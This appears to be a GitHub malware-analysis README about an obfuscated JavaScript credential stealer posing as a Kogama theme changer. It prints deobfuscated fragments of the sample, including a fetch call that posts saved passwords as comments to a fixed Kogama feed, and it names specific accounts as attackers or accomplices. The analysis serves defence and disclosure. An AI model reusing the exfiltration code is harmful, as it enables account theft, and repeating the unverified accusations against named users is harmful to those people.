# Malware Sample Analysis: Obfuscated JavaScript Payload

## Overview
This repository contains an analysis of a malicious JavaScript sample found on Pastebin, which masquerades as a benign "theme changer" utility. The script is heavily obfuscated and exhibits clear malicious behavior.


⚠️ **Warning**: Do not execute this script outside of a controlled sandbox environment.

 💚 Credits to ***Amine*** for helping me realise that no more current leads exist.

## Sample Information
- **Source**: [Pastebin Link](https://pastebin.com/raw/UqK3rjrA)
- **Claimed Function**: Theme changer utility
- **Actual Behavior**: Malicious payload (analysis ongoing)

## Indicators of Compromise
The script exhibits several red flags:

1. **Suspicious Attribution**
   - Unknown author ("Lavar") with no verifiable identity
   - No legitimate project homepage or documentation

2. **Obfuscation Techniques**
   - Heavy use of encoding and string manipulation
   - Unnecessary complexity for stated purpose
   - Obfuscated network calls

3. **Anomalous Code Patterns**
   ```javascript
   fetch('https://www.kogama.com/api/feed/31872096/comment/[...]') // A request to post a comment
   ({'comment':localStorage[_0x5acfe3(0x206)](...)})  // Accessing localStorage (saved data contents)
   const _0x1a7136=['addEventListener','getElementById','application/json','https://www.kogama.com/auth/logout'] // Getting an element by ID and logging us out
   ```

# Technical Analysis

### Initial Deobfuscation
The script employs heavy obfuscation with several immediate red flags:

```javascript
function _0x22fc() {
  const _0x1a7136 = [
    'addEventListener', 'log', 'stringify', 'location', 'status', 
    '173846mcQEUN', '9NpMVeb', 'Success:', '113830LYAXum', 'keyCode',
    'setItem', 'value', 'root-page-mobile', 'password', '71868QrEQBX',
    'getItem', 'error', '2716758eSaPId', 'catch', 'poop',
    'querySelector', 'Error:', '126544zlfMyY', 'lol', '506569BqwGkp',
    '.MuiButtonBase-root.MuiButton-root.MuiButton-text.MuiButton-textDefault...',
    '99qjFQGn', '2MXeZit', 'then', 'getElementById', 'application/json',
    'https://www.kogama.com/auth/logout', '25vivdkf', 'json',
    "Button not found!", '768536FEIJoG', 'POST', 'click',
    '.MuiButtonBase-root.MuiButton-root.MuiButton-contained...',
    "background-image: linear-gradient(135deg, rgb(0 137 255), rgb(0 112 255))"
  ];
  _0x22fc = function() { return _0x1a7136; };
  return _0x22fc();
}
```

###  Key Malicious Behaviors

1. **Anomalous Code Patterns**
   - Sets a localStorage variable named 'poop' to store passwords
   - Calls logout function (https://www.kogama.com/auth/logout) to force re-authentication

2. **Data Exfiltration**
   - Transmits stolen credentials as a "comment" to a fixed Kogama.com feed ID
   - You can view the current state of comments from this object [here](https://www.kogama.com/api/feed/31872096/comment/)
   - If you want to go a few steps ahead, you can compare your findings to what I've saved @ [May 31, 2025 20:24]([https://github.com/vendicatedcore/kgmmlwr/blob/main/Inversion/Script/endpoint/comments.json](https://github.com/vendicatedcore/kgmmlwr/blob/main/Inversion/Script/Data/Comments.json))
```javascript
fetch('https://www.kogama.com/api/feed/31872096/comment/', {
  'method': _0x5acfe3(0x1f3),  // Resolves to 'POST'
  'headers': {
    'Content-Type': _0x5acfe3(0x1ed)  // Resolves to 'application/json'
  },
  'body': JSON[_0x5acfe3(0x1f9)]({  // Resolves to 'stringify'
    'comment': localStorage[_0x5acfe3(0x206)](_0x5acfe3(0x1e2))  // Gets 'password'
  })
```

As of [May 31, 2025 20:24]([https://github.com/vendicatedcore/kgmmlwr/blob/main/Inversion/Script/endpoint/comments.json](https://github.com/vendicatedcore/kgmmlwr/blob/main/Inversion/Script/Data/Comments.json)) the only accounts that have posted any comments under this specific Object are ~~GameCodeMaster~~ and a dummy account @ [Boris Jacob Anderson](https://www.kogama.com/profile/670351929/). Both of those have already changed passwords which could mean two twings. 
~~Either the person behind this script is GameCodeMaster simply testing their own sample, or that account has been stolen because of their naive traits.
Why such theory? GameCodeMaster is an owner of 'Tester' Badge, which these days - isn't rare, but it just may be an indicator.~~

*What of the post/feed that stores the comments? - I'm still trying to locate it, trying to finalise the investigation.
No hits in unpublished projects, deleted maps or anywhere else.
Due to this issue - figuring out who's behind the script is currently impossible.

![image](https://github.com/user-attachments/assets/50b0b399-baad-4b8b-b0e1-7dbb30eeb70f)

> [**This is what happens when you execute the script**](https://youtu.be/cgtRLFCTV40 )


## Conclusion & Recommendations

### Summary of Findings
1. **Malicious Intent Confirmed**  
   The script is definitively a credential stealer masquerading as a theme utility, with:
   - Password harvesting via forced re-authentication
   - Data exfiltration to a public comment feed
   - Deliberate obfuscation to evade detection

2. **Attack Infrastructure**  
   - Utilizes Kogama's legitimate API as C2 channel
   - Targets: `https://www.kogama.com/api/feed/31872096/comment/`
   - Persistence: Stored credentials in `localStorage` under key `'poop'`

3. **Attribution Challenges**  
   - Only two affected accounts detected ~~GameCodeMaster~~ and [Boris Jacob Anderson](https://www.kogama.com/profile/670351929/))
   - Possible scenarios:
     * Attacker testing their own malware
     * Compromised naive accounts
     * False flag operation

### Mitigation Strategies
| Action | Implementation |
|--------|----------------|
| Credential Rotation | All potentially exposed users should change passwords |
| API Monitoring | Kogama should investigate abnormal comment patterns on feed #31872096 |
| Client Protection | Block execution of scripts from untrusted paste sites |

### Future Research Directions
- **Feed Origin Analysis**: Continue hunting for the parent feed object
- **Pattern Correlation**: Compare with other Kogama-targeting malware
- **Attacker TTPs**: Document tactics for threat intelligence sharing

### Community Call-to-Action
Help expand this analysis by:
1. Reporting additional affected accounts via Issues
2. Contributing YARA rules for detection
3. Sharing related samples in the wild

---

# FINAL INVESTIGATION RESULTS

After thorough analysis, it has been determined that the initial hypothesis regarding GameCodeMaster being the threat actor was incorrect. In reality, GameCodeMaster was among three individuals who were coerced through blackmail into developing malicious scripts under the direction of an entity known as 'Inversion'.

Two additional parties involved in this operation, who engaged in harassment and email spamming targeting the victims, have been identified as 'zinxi' and 'g0d_b3rn13'.

> ![Evidence 1](https://github.com/user-attachments/assets/9f92350e-091d-4038-ae28-6f00e670ddf5)
> ![Evidence 2](https://github.com/user-attachments/assets/4083e999-6c48-4bee-91dc-d2c6eaa8c4bc)

## IDENTIFIED THREAT ACTOR
**Primary Actor**: [__ChiefPuddle/Inversion__](https://www.kogama.com/profile/670201468/)  

**Known Alternate Accounts**:  
- [__Asood Moohammed243__](https://www.kogama.com/profile/670339973/)

## ADDITIONAL FINDINGS
The primary threat actor has been actively distributing password-stealer malware through comments on the profile of '[G0D_B3RN13](https://www.kogama.com/profile/669867874/)'.

> ![Malware Distribution Evidence](https://github.com/user-attachments/assets/d009bf9d-c8cf-4da1-8c85-5e248c954596)


**Due to privacy reasons, I'm unable to provide more screenshots.**
